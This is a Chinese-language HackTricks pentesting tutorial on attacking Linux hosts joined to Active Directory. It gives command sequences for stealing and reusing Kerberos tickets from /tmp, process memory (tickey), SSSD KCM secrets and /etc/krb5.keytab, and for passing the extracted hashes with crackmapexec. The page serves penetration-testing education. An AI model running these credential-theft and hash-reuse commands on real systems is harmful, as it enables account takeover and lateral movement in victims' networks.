# Linux Active Directory

{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术： <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}

{% embed url="https://websec.nl/" %}

Linux 机器也可以存在于 Active Directory 环境中。

在 AD 中的 Linux 机器可能会 **在文件中存储不同的 CCACHE 票证。这些票证可以像其他任何 Kerberos 票证一样被使用和滥用**。要读取这些票证，您需要是票证的用户所有者或 **root** 用户。

## 枚举

### 从 Linux 进行 AD 枚举

如果您在 Linux（或 Windows 中的 bash）上访问 AD，您可以尝试 [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) 来枚举 AD。

您还可以查看以下页面以了解 **从 Linux 枚举 AD 的其他方法**：

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

FreeIPA 是 Microsoft Windows **Active Directory** 的开源 **替代品**，主要用于 **Unix** 环境。它结合了完整的 **LDAP 目录** 和 MIT **Kerberos** 密钥分发中心，管理方式类似于 Active Directory。利用 Dogtag **证书系统** 进行 CA 和 RA 证书管理，支持 **多因素** 身份验证，包括智能卡。集成了 SSSD 以支持 Unix 身份验证过程。了解更多信息：

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## 操作票证

### Pass The Ticket

在此页面中，您将找到不同的地方，您可以 **在 Linux 主机中找到 Kerberos 票证**，在以下页面中，您可以了解如何将这些 CCache 票证格式转换为 Kirbi（您在 Windows 中需要使用的格式），以及如何执行 PTT 攻击：

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### 从 /tmp 重用 CCACHE 票证

CCACHE 文件是用于 **存储 Kerberos 凭据** 的二进制格式，通常以 600 权限存储在 `/tmp` 中。这些文件可以通过其 **名称格式 `krb5cc_%{uid}`** 进行识别，与用户的 UID 相关联。要验证身份验证票证，**环境变量 `KRB5CCNAME`** 应设置为所需票证文件的路径，以便重用。

使用 `env | grep KRB5CCNAME` 列出当前用于身份验证的票证。该格式是可移植的，票证可以通过使用 `export KRB5CCNAME=/tmp/ticket.ccache` 设置环境变量来 **重用**。Kerberos 票证名称格式为 `krb5cc_%{uid}`，其中 uid 是用户 UID。
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### CCACHE 票据重用来自密钥环

**存储在进程内存中的 Kerberos 票据可以被提取**，特别是在机器的 ptrace 保护被禁用时（`/proc/sys/kernel/yama/ptrace_scope`）。一个有用的工具可以在 [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) 找到，它通过注入会话并将票据转储到 `/tmp` 来方便提取。

要配置和使用此工具，请按照以下步骤进行：
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
此过程将尝试注入到各种会话中，通过将提取的票证存储在 `/tmp` 中，命名约定为 `__krb_UID.ccache` 来指示成功。

### 来自SSSD KCM的CCACHE票证重用

SSSD在路径 `/var/lib/sss/secrets/secrets.ldb` 处维护数据库的副本。相应的密钥存储为隐藏文件，路径为 `/var/lib/sss/secrets/.secrets.mkey`。默认情况下，只有在您具有 **root** 权限时，才能读取该密钥。

使用 **`SSSDKCMExtractor`** 及其 --database 和 --key 参数将解析数据库并 **解密秘密**。
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**凭证缓存 Kerberos blob 可以转换为可用的 Kerberos CCache** 文件，可以传递给 Mimikatz/Rubeus。

### 从 keytab 重用 CCACHE 票证
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### 从 /etc/krb5.keytab 提取账户

服务账户密钥，对于以 root 权限运行的服务至关重要，安全地存储在 **`/etc/krb5.keytab`** 文件中。这些密钥类似于服务的密码，要求严格保密。

要检查 keytab 文件的内容，可以使用 **`klist`**。该工具旨在显示密钥详细信息，包括用户身份验证的 **NT Hash**，特别是当密钥类型被识别为 23 时。
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
对于Linux用户，**`KeyTabExtract`** 提供了提取RC4 HMAC哈希的功能，这可以用于NTLM哈希重用。
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
在 macOS 上，**`bifrost`** 作为一个工具用于 keytab 文件分析。
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
利用提取的账户和哈希信息，可以使用工具如 **`crackmapexec`** 建立与服务器的连接。
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## 参考文献

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **在 Twitter 上关注** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
